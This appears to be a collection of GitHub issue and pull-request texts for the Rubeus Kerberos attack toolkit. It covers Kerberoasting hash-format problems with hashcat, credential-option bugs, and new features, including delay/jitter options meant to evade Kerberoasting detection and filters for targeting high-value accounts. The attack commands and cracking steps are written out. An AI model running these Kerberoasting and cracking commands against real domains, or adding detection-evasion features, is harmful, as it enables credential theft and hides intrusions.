@@ -1,0 +1,173 @@
+Doing:
+```
+> rubeus.exe kerberoast /format:hashcat /aes
+```
+... produces AES256 hashes in the format:
+```
+$krb5tgs$18$*[username]$[domain]$[spn]*$[checksum]$[edata]
+```
+
+Feeding this to hashcat (v5.1.0) results in an error:
+```
+~> hashcat -m 19700 -o cracked.txt -a 0 krb5tgs.txt password.txt
+
+Hashfile 'krb5tgs.txt' on line 1 ($krb5t...3bc0e660c3164355a02806c3d248afc0): Separator unmatched
+No hashes loaded.
+```
+
+Looking at [the corresponding hashcat module](https://github.com/hashcat/hashcat/blob/master/src/modules/module_19700.c#L138), the expected format is: 
+
+```
+$krb5tgs$18$[username]$[domain]$*[spn]*$[checksum]$[edata]
+```
+
+Manually updating the hash from Rubeus results in another error
+```
+~> hashcat -m 19700 -o cracked.txt -a 0 krb5tgs2.txt password.txt
+
+Hashfile 'krb5tgs2.txt' on line 1 ($krb5t...3bc0e660c3164355a02806c3d248afc0): Token length exception
+No hashes loaded.
+```
+
+Apparently hashcat expects the [`checksum` to be exactly 24 chars wide](https://github.com/hashcat/hashcat/blob/master/src/modules/module_19700.c#L166). 
+
+Manually moving the `$` separator 8 chars up makes hashcat load the hash, but doesn't succeed in cracking it. I suspect we need to re-calculate the checksum over the [`cipherText`](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/Roast.cs#L740) part, but I'm a bit out of my depth here 😄 
+The nonce, sequence number should be randomized:
+
+```
+%> grep 1818848256 -R
+Rubeus/lib/krb_structures/EncKrbPrivPart.cs:            seq_number = 1818848256;
+Rubeus/lib/krb_structures/EncKrbPrivPart.cs:            seq_number = 1818848256;
+Rubeus/lib/krb_structures/KDC_REQ_BODY.cs:            nonce = 1818848256;
+Rubeus/lib/Reset.cs:            ap_req.authenticator.seq_number = 1818848256;
+```
+
+When using alternate credentials, the /creduser must be specified with: **/creduser:DOMAIN.FQDN\USER**
+
+However, this does not work and Rubeus can not connect to the DC:
+```
+.\Rubeus.exe kerberoast /creduser:example.com\demo /credpassword:Password123 /dc:192.168.0.38 /domain:example.com
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.4.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : example.com
+
+[X] Error creating the domain searcher: The LDAP-Server is not available.
+```
+
+
+But when I am using the IP of the DC, everything works as expected:
+```
+.\Rubeus.exe kerberoast /creduser:192.168.0.38\demo /credpassword:Password123 /dc:192.168.0.38 /domain:example.com
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.4.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : example.com
+[*] Using alternate creds  : 192.168.0.38\demo
+[*] Searching path 'LDAP://192.168.0.38' for Kerberoastable users
+
+[X] No users found to Kerberoast!
+```
+
+
+Please add the support for alternate credentials when performing /rc4opsec mode on kerberoast.
+
+This is not supported atm and Rubeus tries to get a TGT for the current user instead:
+
+```
+.\Rubeus.exe kerberoast /rc4opsec /format:hashcat /creduser:example.com\demo /credpassword:Password123 /dc:192.168.0.38 /domain:example.com
+
+
+[*] Action: Kerberoasting
+
+[*] Using 'tgtdeleg' to request a TGT for the current user
+
+  [X] Error 1355 retrieving domain controller : Die angegebene Domäne ist nicht vorhanden, oder es konnte keine Verbindung hergestellt werden
+[X] Error retrieving current domain controller
+
+[!] Unhandled Rubeus exception:
+
+System.NullReferenceException: Der Objektverweis wurde nicht auf eine Objektinstanz festgelegt.
+   bei Asn1.AsnElt.Decode(Byte[] buf, Boolean exactLength)
+   bei Rubeus.KRB_CRED..ctor(Byte[] bytes)
+   bei Rubeus.Roast.Kerberoast(String spn, String userName, String OUName, String domain, String dc, NetworkCredential cred, String outFile, KRB_CRED TGT, Boolean useTGTdeleg, String supportedEType, String pwdSetAfter, String pwdSetBefore, Int32 resultLimit)
+   bei Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)
+   bei Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   bei Rubeus.Program.Main(String[] args)
+```
+I added two new options for the kerberoasting command:
+
+- `/delay:[millisec]`. The number of millisec to wait from one TGS-REQ to another;
+- `/jitter:[percentace]`. The percentage of jitter to add to each delay.
+
+The aim of these two new options is to evade basic Kerberoasting detections that rely on the number of requested ticket in a short amount of time.
+Hi,
+
+I added the `/admincount` option in the `kerberoast` command.
+This flag will allow the user to select user accounts with the attribute `AdminCount` set to 1.
+This could help in situations where the user wants to quickly target only high-value targets.
+
+While the `AdminCount` attribute does not garantee that the user is still in a sensitive group, it's certanly a good indicator. 
+Is x32 systems supported?
+running 
+`dump`
+on Windows 7 x32 gives 
+`[X] Error 87 calling LsaCallAuthenticationPackage for target ... : The parameter is incorrect. `
+both compiling AnyCpu and x86.
+Seems like KERB_RETRIEVE_TKT_REQUEST structure size error.
+
+
+Provide the ability to specify an `/ldapfilter:"(property=X)"` option for granular user targeting in the **kerberoast** and **asreproast** functions.
+Only extract tickets for the current user, even if elevated.
+I was having an issue getting the domain controller during my testing of the kerberoasting functionality.  The issue seems to be the function GetDCName().  Note, I ran this with and without the built in impersonation, and using the SimpleImpersonation library.  My solution for my very specific use case was to modify the GetDCName() code as follows:
+
+`if (ERROR_SUCCESS == val)
+            {
+                domainInfo = (Interop.DOMAIN_CONTROLLER_INFO)Marshal.PtrToStructure(pDCI, typeof(Interop.DOMAIN_CONTROLLER_INFO));
+                string dcName = domainInfo.DomainControllerName;
+                Interop.NetApiBufferFree(pDCI);
+                return dcName.Trim('\\');
+            }
+            else
+            {
+                try
+                {
+                    **string pdc = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().PdcRoleOwner.Name;
+                    return pdc;**
+                }
+                catch
+                {
+                    string errorMessage = new Win32Exception((int)val).Message;
+                    Console.WriteLine("\r\n  [X] Error {0} retrieving domain controller : {1}", val, errorMessage);
+                    Interop.NetApiBufferFree(pDCI);
+                    return "";
+                }
+            }`
+
+This seems to have solved my little issue.  But just wanted to let you know.  
